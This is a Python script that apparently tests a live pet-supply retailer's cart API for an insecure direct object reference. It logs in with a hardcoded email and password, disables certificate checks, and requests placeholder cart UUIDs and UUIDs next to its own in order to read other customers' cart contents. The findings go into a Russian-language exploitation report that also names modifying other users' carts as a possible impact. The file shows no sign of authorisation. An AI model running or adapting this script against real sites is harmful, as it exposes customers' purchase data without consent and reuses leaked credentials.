#!/usr/bin/env python3
"""Test cart IDOR - verify we can get real different cart data"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# Get our cart
our_cart_uuid = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
print("[*] Getting our cart...")
try:
    resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{our_cart_uuid}", timeout=5, verify=False)
    if resp.status_code == 200:
        our_cart = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        our_cart_str = json.dumps(our_cart, sort_keys=True)
        our_articles = our_cart.get('articles', [])
        print(f"  [OK] Our cart has {len(our_articles)} articles")
        if our_articles:
            print(f"      First article: {json.dumps(our_articles[0])[:200]}")
except: pass

# Test other carts - look for carts with actual data
print("\n[*] Testing other carts for IDOR...")
test_uuids = [
    "00000000-0000-0000-0000-000000000000",
    "11111111-1111-1111-1111-111111111111",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
]

for cart_uuid in test_uuids:
    try:
        resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{cart_uuid}", timeout=5, verify=False)
        if resp.status_code == 200:
            cart = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(cart, dict):
                articles = cart.get('articles', [])
                cart_id = cart.get('cartId')
                total = cart.get('shipments', [{}])[0].get('shipmentTotal', 0) if cart.get('shipments') else 0
                
                # Check if this cart has different data
                if articles or cart_id or total > 0:
                    cart_str = json.dumps(cart, sort_keys=True)
                    if cart_str != our_cart_str:
                        print(f"  [CRITICAL] IDOR - Different cart: {cart_uuid}")
                        print(f"      Articles: {len(articles)}")
                        print(f"      Cart ID: {cart_id}")
                        print(f"      Total: {total}")
                        if articles:
                            print(f"      First article: {json.dumps(articles[0])[:200]}")
                        
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": f"/checkout/api/cart-api/v2/cart/{cart_uuid}",
                            "cart_uuid": cart_uuid,
                            "articles_count": len(articles),
                            "cart_id": cart_id,
                            "total": total,
                            "data": cart_str[:500]
                        })
    except: pass

# Try to enumerate carts by incrementing UUID
print("\n[*] Testing cart enumeration...")
# Our UUID: 6bd223b4-5040-4faa-ba85-6a85c1ec2d50
# Try nearby UUIDs
base_uuid = "6bd223b4-5040-4faa-ba85-6a85c1ec2d"
for i in range(40, 60):  # Test nearby UUIDs
    test_uuid = f"{base_uuid}{i:02x}"
    try:
        resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{test_uuid}", timeout=2, verify=False)
        if resp.status_code == 200:
            cart = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(cart, dict):
                articles = cart.get('articles', [])
                if articles:
                    print(f"  [CRITICAL] Found cart with articles: {test_uuid}")
                    found_vulns.append({
                        "type": "idor",
                        "severity": "CRITICAL",
                        "endpoint": f"/checkout/api/cart-api/v2/cart/{test_uuid}",
                        "cart_uuid": test_uuid,
                        "articles_count": len(articles),
                        "data": json.dumps(cart)[:500]
                    })
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL IDOR vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        print(f"    Cart UUID: {v['cart_uuid']}")
        if 'articles_count' in v:
            print(f"    Articles: {v['articles_count']}")
        if 'cart_id' in v:
            print(f"    Cart ID: {v['cart_id']}")
        if 'total' in v:
            print(f"    Total: {v['total']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ IDOR - ДОСТУП К КОРЗИНАМ ДРУГИХ ПОЛЬЗОВАТЕЛЕЙ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper()}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Cart UUID:** `{v['cart_uuid']}`\n\n")
            if 'articles_count' in v:
                f.write(f"**Articles Count:** `{v['articles_count']}`\n\n")
            if 'cart_id' in v:
                f.write(f"**Cart ID:** `{v['cart_id']}`\n\n")
            if 'total' in v:
                f.write(f"**Total:** `{v['total']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            f.write("**Description:** Критичная IDOR уязвимость позволяет получать данные корзин других пользователей по UUID.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Просмотр товаров в корзинах других пользователей\n")
            f.write("- Раскрытие информации о покупках\n")
            f.write("- Потенциальная модификация чужих корзин\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  Cart IDOR not fully confirmed")

print("=" * 70)

